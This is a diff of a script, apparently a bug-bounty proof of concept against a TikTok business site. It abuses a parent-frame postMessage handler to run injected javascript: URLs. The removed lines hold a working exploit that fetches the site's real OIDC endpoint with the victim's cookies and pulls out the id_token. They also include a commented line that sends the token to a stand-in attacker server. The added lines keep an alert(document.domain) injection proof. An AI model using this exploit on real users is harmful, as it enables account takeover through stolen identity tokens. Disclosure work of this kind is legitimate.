@@ -1,24 +1,6 @@
 <script>
-    // Step 1: Send postMessage to parent to fetch the id_token and send it back
-    parent.postMessage({
-        action: "requestRedirectionTo",
-        targetUrlStr: "javascript:(async () => { try { const response = await fetch('https://business-sso.tiktok.com/oidc/web_auth/?aid=1583&client_id=fae9da30-e377-406a-941d-3ceea97626f4&nonce=NXtW0CiWFxuvarlKF9qs_TMrv9HqHYJUHgO961Gu6i8%3D&redirect_uri=https%3A%2F%2Fbusiness-suite.tiktokw.eu%2Fmessage%2Fauth&response_type=id_token&scope=user_id&state=eyJfcHJlIjoiMDQwYzlkNWYtNDVhNS00NmY2LWI1ZDYtOWY3N2M3Mzg3ZTRiIiwiYnNfaWQiOiIiLCJsYW5nIjoiZW4iLCJvcmdfaWQiOiIiLCJwYXRobmFtZSI6Ii9jaGVja19sb2dpbi8ifQ%3D%3D', { method: 'GET', credentials: 'include', redirect: 'manual' }); if (response.status === 302) { const location = response.headers.get('Location'); if (location) { const url = new URL(location); const hashParams = new URLSearchParams(url.hash.substr(1)); const id_token = hashParams.get('id_token'); window.parent.postMessage({ id_token: id_token, source: 'parent' }, '*'); } else { window.parent.postMessage({ error: 'No Location header in response' }, '*'); } } else { window.parent.postMessage({ error: 'Unexpected status: ' + response.status }, '*'); } } catch (e) { window.parent.postMessage({ error: 'Fetch failed: ' + e.message }, '*'); } })();"
-    }, "*");
-
-    // Step 2: Listen for the parent's response in the iframe
-    window.addEventListener('message', event => {
-        if (event.data && event.data.source === 'parent') {
-            if (event.data.id_token) {
-                // Successfully received id_token
-                console.log('Stolen id_token:', event.data.id_token);
-                alert('Stolen id_token: ' + event.data.id_token);
-                // Optional: Exfiltrate to attacker server
-                // fetch('https://your-attacker-server.com/steal?id_token=' + encodeURIComponent(event.data.id_token));
-            } else if (event.data.error) {
-                // Handle errors for debugging
-                console.error('Parent error:', event.data.error);
-                alert('Error from parent: ' + event.data.error);
-            }
-        }
-    });
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:alert(document.domain)"
+}, "*");
 </script>
